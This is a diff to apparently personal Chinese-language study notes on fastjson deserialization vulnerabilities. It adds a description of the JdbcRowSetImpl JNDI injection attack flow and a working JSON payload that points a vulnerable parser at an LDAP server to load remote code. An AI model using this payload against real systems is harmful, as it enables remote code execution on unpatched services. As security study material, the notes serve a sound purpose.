@@ -438,7 +438,7 @@ public Map getMap() {
 
 ### 漏洞利用
 
-##### 简单利用demo
+#### 简单利用demo
 
 JSONUser.Java
 
@@ -471,6 +471,30 @@ public class Test {
 ```
 
 这样就能成功打开计算机了，虽然Test类里面没有定义cmd这个变量，但是fastjson依旧会对他进行解析并调用
+
+#### **JdbcRowSetImpl 反序列化**(<=1.2.24)：
+
+##### 攻击流程：
+
+1. 首先是这个lookup(URI)参数可控
+2. 攻击者控制URI参数为指定为恶意的一个RMI服务
+3. 攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类；
+4. 目标在进行`lookup()`操作时，会动态加载并实例化Factory类，接着调用`factory.getObjectInstance()`获取外部远程对象实例；
+5. 攻击者可以在Factory类文件的静态代码块处写入恶意代码，达到RCE的效果；
+
+##### payload：
+
+```java
+{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:23457/Command8","autoCommit":true}
+```
+
+#### **TemplatesImpl 反序列化(<=1.2.24)：**
+
+
+
+
+
+
 
 
 
